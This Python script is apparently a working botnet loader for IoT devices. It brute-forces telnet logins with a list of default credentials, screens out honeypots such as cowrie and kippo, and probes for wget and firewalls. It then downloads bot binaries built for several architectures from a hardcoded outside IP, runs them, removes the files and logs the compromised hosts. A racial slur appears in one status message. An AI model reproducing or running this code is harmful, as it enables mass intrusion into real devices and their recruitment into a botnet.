#!/usr/bin/env python3
# Telnet Bruter
import threading
import sys, os, re, time, socket
from queue import Queue
from sys import stdout

if len(sys.argv) < 4:
	print("Usage: python "+sys.argv[0]+" <list> <threads> <output file>")
	sys.exit()

combo = [ 
	"root:",
	"admin:",
	"root:root",
	"admin:admin",
	"user:user",
	"ubnt:ubnt",
	"ubuntu:ubuntu",
	"guest:guest",
	"support:support",
	"default:default",
	"test:test",
	"fake:fake",
	"root:admin",
	"admin:root",
	"root:123",
	"root:1234",
	"root:12345",
	"root:123456",
	"root:changeme",
	"admin:changeme",
	"guest:1234",
	"guest:12345",
	"guest:123456",
	"admin:1234",
	"admin:12345",
	"admin:123456",
	"hikvision:hikvision",
	"root:toor",
	":",
	"operator:operator",
	"ftp:ftp",
	"root:888888",
	"default:",
	"1234:1234"
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
	queue_count += 1
	queue.put(ip)
print("[*] Loaded %d IPs to scan" % queue_count)


class router(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		for passwd in combo:
			username = ""
			password = ""
			
			# Parse username and password from combo
			if ":" in passwd:
				parts = passwd.split(":", 1)
				username = parts[0]
				password = parts[1]
			
			# Try to connect and authenticate
			try:
				tn = socket.socket()
				tn.settimeout(3)  # Reduced from 8 to 3 seconds
				tn.connect((self.ip, 23))
			except Exception:
				try:
					tn.close()
				except:
					pass
				# Connection failed, but continue trying other combos
				continue
			
			try:
				# Fast login sequence - reduced timeouts
				tn.settimeout(1.5)
				hoho = readUntil(tn, "ogin:", timeout=1.5)
				if "ogin" in hoho:
					tn.send((username + "\n").encode())
					time.sleep(0.05)  # Reduced from 0.09
				else:
					try:
						tn.close()
					except:
						pass
					continue
			except Exception:
				try:
					tn.close()
				except:
					pass
				continue
			
			try:
				# Fast password sequence
				tn.settimeout(1.5)
				hoho = readUntil(tn, "assword:", timeout=1.5)
				if "assword" in hoho:
					tn.send((password + "\n").encode())
					time.sleep(0.3)  # Reduced from 0.8
			except Exception:
				try:
					tn.close()
				except:
					pass
				continue
			
			try:
				# Check for successful login (quick banner + prompt read)
				tn.settimeout(1.0)
				prompt = tn.recv(2048).decode('utf-8', errors='ignore')
				success = False
				# Fast-path prompt detection
				if (">" in prompt and "ONT" not in prompt) or ("#" in prompt) or ("$" in prompt) or ("%" in prompt) or ("@" in prompt):
					success = True
				
				if success:
					# Optimized legit check (single RTT)
					if not self.is_legit_telnet(tn):
						# Log fake/honeypot result to console
						try:
							print("\033[31m[FAKE]\033[37m %s:23 %s:%s" % (self.ip, username, password))
						except:
							pass
						try:
							tn.close()
						except:
							pass
						continue
					# Real device - Successful login!
					# Test wget capability
					wget_ok = self.test_wget(tn)
					wget_status = "wget:OK" if wget_ok else "wget:NO"
					
					# Detect firewall
					firewall_detected, firewall_type = self.detect_firewall(tn)
					firewall_status = f"FIREWALL:{firewall_type}" if firewall_detected else "FIREWALL:NONE"
					
					# Only export to file if wget is available
					exploit_success = False
					if wget_ok:
						# Deliver payload if wget is available
						exploit_success = self.deliver_payload(tn)
						
						# Only add to output file if exploit succeeded
						if exploit_success:
							os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"")
					
					# Add exploit status to log line
					exploit_status = "EXPLOIT:OK" if exploit_success else "EXPLOIT:NO"
					
					# Log GOTCHA line with all status info
					if exploit_success:
						print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m [%s] [%s] [%s]" % (username, password, self.ip, wget_status, exploit_status, firewall_status))
					else:
						print("\033[32m[\033[31m+\033[32m] \033[33mmaybe next time nigga \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m [%s] [%s] [%s]" % (username, password, self.ip, wget_status, exploit_status, firewall_status))
					try:
						tn.close()
					except:
						pass
					break
				else:
					# Wrong credentials, try next combo
					try:
						tn.close()
					except:
						pass
			except Exception:
				try:
					tn.close()
				except:
					pass
	
	def is_legit_telnet(self, tn):
		"""Fast legit telnet detection with minimal RTTs and banner heuristics."""
		try:
			# Tight timeouts for snappy detection
			tn.settimeout(0.6)
			# Single round-trip: echo marker and probe busybox version in one go
			marker = "__AK47CHK__"
			probe = ("echo " + marker + " && (busybox 2>/dev/null || true)\n").encode()
			tn.send(probe)
			time.sleep(0.25)
			data = b""
			try:
				chunk = tn.recv(4096)
				if chunk:
					data += chunk
				# Try to drain a bit more without blocking too long
				tn.settimeout(0.2)
				for _ in range(2):
					try:
						chunk = tn.recv(4096)
						if not chunk:
							break
						data += chunk
					except:
						break
			except:
				pass
			resp = data.decode('utf-8', errors='ignore')
			# Honeypot/fake banners to filter quickly
			banners_sus = [
				"cowrie", "kippo", "honeypot", "artillery", "conpot", "dionaea",
				"nasl", "honeynet", "mock", "emulated", "unknown command"
			]
			lower = resp.lower()
			for bad in banners_sus:
				if bad in lower:
					return False
			# Need marker back to ensure command execution
			if marker not in resp:
				return False
			# Strong IoT indicators
			if "busybox" in lower or "applet" in lower or "built-in" in lower:
				return True
			# Fallback: environment check with a tiny RTT
			tn.settimeout(0.4)
			tn.send(b"uname -a || cat /proc/version || true\n")
			time.sleep(0.2)
			more = b""
			try:
				more = tn.recv(4096)
			except:
				pass
			mresp = (resp + more.decode('utf-8', errors='ignore')).lower()
			linux_indicators = ["linux", "gnu", "uclibc", "musl", "openwrt", "lede", "android"]
			if any(ind in mresp for ind in linux_indicators):
				return True
			return False
		except:
			return False
	
	def test_wget(self, tn):
		"""Test if wget is available on the device - optimized for speed"""
		try:
			tn.settimeout(0.8)  # Reduced from 1.0
			# Fast wget test - single command
			tn.send(b"command -v wget 2>/dev/null || echo NOWGET\n")
			time.sleep(0.2)  # Reduced from 0.3
			
			response = b""
			try:
				response = tn.recv(1024)  # Reduced buffer size
			except:
				pass
			
			resp = response.decode('utf-8', errors='ignore').lower()
			
			# Quick check - if we get "NOWGET" it means wget not found
			return "nowget" not in resp and ("wget" in resp or len(resp.strip()) > 0)
		except:
			return False
	
	def detect_firewall(self, tn):
		"""Detect if firewall is running that might block CNC connections"""
		firewall_detected = False
		firewall_type = "NONE"
		
		try:
			# Wait for shell prompt to ensure we're authenticated
			time.sleep(0.5)
			
			# Check for common firewall services and rules
			firewall_commands = [
				"iptables -L 2>/dev/null | head -10",
				"ufw status 2>/dev/null",
				"firewall-cmd --state 2>/dev/null",
				"systemctl status iptables 2>/dev/null",
				"systemctl status ufw 2>/dev/null",
				"systemctl status firewalld 2>/dev/null",
				"ps aux | grep -i firewall",
				"ps aux | grep -i iptables",
				"ps aux | grep -i ufw",
				"iptables -t nat -L 2>/dev/null | head -5",
				"iptables -t mangle -L 2>/dev/null | head -5",
				"cat /etc/iptables/rules.v4 2>/dev/null | head -10",
				"cat /etc/ufw/ufw.conf 2>/dev/null | head -5"
			]
			
			for cmd in firewall_commands:
				try:
					tn.send(f"{cmd}\n".encode())
					time.sleep(0.3)
					response = tn.recv(1024).decode('utf-8', errors='ignore').lower()
					
					# Check for active firewall indicators
					if any(indicator in response for indicator in [
						"active", "running", "enabled", "chain input", "chain forward", "chain output",
						"policy drop", "policy reject", "drop", "reject", "deny"
					]):
						firewall_detected = True
						
						# Determine firewall type
						if "iptables" in response:
							firewall_type = "IPTABLES"
						elif "ufw" in response:
							firewall_type = "UFW"
						elif "firewalld" in response or "firewall-cmd" in response:
							firewall_type = "FIREWALLD"
						elif "firewall" in response:
							firewall_type = "FIREWALL"
						else:
							firewall_type = "UNKNOWN"
						
						break
						
				except:
					continue
			
			# Additional checks for restrictive rules
			if not firewall_detected:
				try:
					# Check if outbound connections are blocked
					tn.send(b"ping -c 1 8.8.8.8 2>/dev/null || echo PING_FAILED\n")
					time.sleep(1)
					response = tn.recv(512).decode('utf-8', errors='ignore')
					if "PING_FAILED" in response:
						firewall_detected = True
						firewall_type = "RESTRICTIVE"
				except:
					pass
			
			return firewall_detected, firewall_type
			
		except:
			return False, "NONE"
	
	def deliver_payload(self, tn):
		"""Download and execute payloads from the bins directory"""
		success_count = 0
		
		try:
			# Wait for shell prompt to ensure we're authenticated
			time.sleep(0.5)
			
			# Change to /tmp directory
			tn.send(b"cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /mnt 2>/dev/null || cd /root 2>/dev/null || cd /\n")
			time.sleep(0.2)
			
			# Detect target architecture first
			arch = self.detect_architecture(tn)
			if not arch:
				# If architecture detection fails, try all binaries
				arch = 'unknown'
			
			base_url = "http://185.247.117.214/bins/"
			
			# List of all available binaries to try
			all_binaries = [
				"static.arm", "static.arm5", "static.arm6", "static.arm7",
				"static.mips", "static.mpsl", "static.x86", "static.ppc", 
				"static.sh4", "static.m68k", "static.spc"
			]
			
			# Start with architecture-specific binary, then try others
			priority_binary = self.select_binary_for_arch(arch)
			if priority_binary and priority_binary in all_binaries:
				all_binaries = [priority_binary] + [b for b in all_binaries if b != priority_binary]
			
			# Try each binary until one succeeds
			for binary in all_binaries:
				try:
					# Log which binary we're trying
					try:
						os.system(f"echo '[{self.ip}] Trying binary: {binary}' >> {output_file}.responses")
					except:
						pass
					# Try to download the binary with multiple methods
					download_success = False
					download_methods = [
						f"wget -q {base_url}{binary} -O {binary} 2>/dev/null",
						f"busybox wget -q {base_url}{binary} -O {binary} 2>/dev/null", 
						f"curl -s {base_url}{binary} -o {binary} 2>/dev/null",
						f"fetch {base_url}{binary} -o {binary} 2>/dev/null"
					]
					
					for method in download_methods:
						try:
							tn.send(f"{method}\n".encode())
							time.sleep(0.3)
							
							# Check if download succeeded
							tn.send(f"test -f {binary} && echo DOWNLOAD_OK || echo DOWNLOAD_FAIL\n".encode())
							time.sleep(0.2)
							
							response = tn.recv(512).decode('utf-8', errors='ignore')
							if "DOWNLOAD_OK" in response:
								download_success = True
								break
								
						except:
							continue
					
					if not download_success:
						continue
					
					# Make executable
					tn.send(f"chmod 777 {binary} 2>/dev/null\n".encode())
					time.sleep(0.1)
					
					# Try multiple execution techniques for this binary
					execution_success = False
					
					# Technique 1: Direct execution with output capture
					try:
						tn.send(f"./{binary} 2>&1\n".encode())
						time.sleep(0.8)
						response = b""
						for _ in range(2):
							try:
								chunk = tn.recv(1024)
								if chunk:
									response += chunk
								time.sleep(0.3)
							except:
								break
						
						response_text = response.decode('utf-8', errors='ignore')
						# Log binary execution response
						try:
							os.system(f"echo '[{self.ip}] {binary} Response: {response_text.strip()}' >> {output_file}.responses")
						except:
							pass
						
						if any(indicator in response_text.lower() for indicator in [
							"kaizen", "evolving", "binary", "executed", "running"
						]):
							execution_success = True
					except:
						pass
					
					# Technique 2: Background execution with process check
					if not execution_success:
						try:
							tn.send(f"./{binary} &\n".encode())
							time.sleep(0.5)
							tn.send(f"ps | grep {binary} | grep -v grep\n".encode())
							time.sleep(0.3)
							ps_response = tn.recv(512).decode('utf-8', errors='ignore')
							# Log process check response
							try:
								os.system(f"echo '[{self.ip}] {binary} Process Check: {ps_response.strip()}' >> {output_file}.responses")
							except:
								pass
							if binary in ps_response:
								execution_success = True
						except:
							pass
					
					# Technique 3: Shell execution
					if not execution_success:
						try:
							tn.send(f"sh -c './{binary}' &\n".encode())
							time.sleep(0.5)
							tn.send(f"ps | grep {binary} | grep -v grep\n".encode())
							time.sleep(0.3)
							ps_response = tn.recv(512).decode('utf-8', errors='ignore')
							# Log shell execution response
							try:
								os.system(f"echo '[{self.ip}] {binary} Shell Process: {ps_response.strip()}' >> {output_file}.responses")
							except:
								pass
							if binary in ps_response:
								execution_success = True
						except:
							pass
					
					# Technique 4: Busybox execution
					if not execution_success:
						try:
							tn.send(f"busybox sh -c './{binary}' &\n".encode())
							time.sleep(0.5)
							tn.send(f"ps | grep {binary} | grep -v grep\n".encode())
							time.sleep(0.3)
							ps_response = tn.recv(512).decode('utf-8', errors='ignore')
							# Log busybox execution response
							try:
								os.system(f"echo '[{self.ip}] {binary} BusyBox Process: {ps_response.strip()}' >> {output_file}.responses")
							except:
								pass
							if binary in ps_response:
								execution_success = True
						except:
							pass
					
					# Technique 5: NoHup execution
					if not execution_success:
						try:
							tn.send(f"nohup ./{binary} >/dev/null 2>&1 &\n".encode())
							time.sleep(0.5)
							tn.send(f"ps | grep {binary} | grep -v grep\n".encode())
							time.sleep(0.3)
							ps_response = tn.recv(512).decode('utf-8', errors='ignore')
							# Log nohup execution response
							try:
								os.system(f"echo '[{self.ip}] {binary} NoHup Process: {ps_response.strip()}' >> {output_file}.responses")
							except:
								pass
							if binary in ps_response:
								execution_success = True
						except:
							pass
					
					# Final fallback: Just run in background
					if not execution_success:
						try:
							tn.send(f"./{binary} >/dev/null 2>&1 &\n".encode())
							time.sleep(0.3)
							execution_success = True  # Assume success
						except:
							pass
					
					if execution_success:
						success_count += 1
						# If we got a successful execution, we can stop trying other binaries
						break
				except:
					continue
			
			# Clean up downloaded files
			tn.send(b"rm -f static.* 2>/dev/null\n")
			time.sleep(0.1)
			
			# Return True if at least one binary was successfully delivered
			return success_count > 0
			
		except:
			return False
	
	def detect_architecture(self, tn):
		"""Detect target system architecture"""
		try:
			# Wait for shell prompt to ensure we're authenticated
			time.sleep(0.3)
			
			# Try multiple methods to detect architecture
			arch_commands = [
				"uname -m",
				"arch",
				"cat /proc/cpuinfo | grep -i 'model name' | head -1",
				"cat /proc/cpuinfo | grep -i 'processor' | head -1"
			]
			
			for cmd in arch_commands:
				try:
					tn.send(f"{cmd}\n".encode())
					time.sleep(0.5)
					response = tn.recv(1024).decode('utf-8', errors='ignore').lower()
					
					# Log architecture detection
					try:
						os.system(f"echo '[{self.ip}] Architecture Check: {response.strip()}' >> {output_file}.responses")
					except:
						pass
					
					# Parse architecture
					if any(arch in response for arch in ['arm', 'aarch64']):
						return 'arm'
					elif any(arch in response for arch in ['mips', 'mipsel']):
						return 'mips'
					elif any(arch in response for arch in ['x86_64', 'i386', 'i686']):
						return 'x86'
					elif any(arch in response for arch in ['ppc', 'powerpc']):
						return 'ppc'
					elif any(arch in response for arch in ['sh4', 'sh']):
						return 'sh4'
					elif any(arch in response for arch in ['m68k']):
						return 'm68k'
					elif any(arch in response for arch in ['sparc']):
						return 'spc'
					
				except:
					continue
			
			# Default to x86 if detection fails
			return 'x86'
			
		except:
			return 'x86'
	
	def select_binary_for_arch(self, arch):
		"""Select appropriate binary for detected architecture"""
		arch_map = {
			'arm': 'static.arm',
			'mips': 'static.mips', 
			'x86': 'static.x86',
			'ppc': 'static.ppc',
			'sh4': 'static.sh4',
			'm68k': 'static.m68k',
			'spc': 'static.spc'
		}
		return arch_map.get(arch, 'static.x86')

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024).decode('utf-8', errors='ignore')
		time.sleep(0.005)  # Reduced from 0.01
		if string in buf: return buf
	raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				IP = queue.get()
				thread = router(IP)
				thread.start()
				queue.task_done()
				time.sleep(0.01)  # Reduced thread delay
			except:
				pass
	except:
		pass

for l in range(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
	except:
		pass
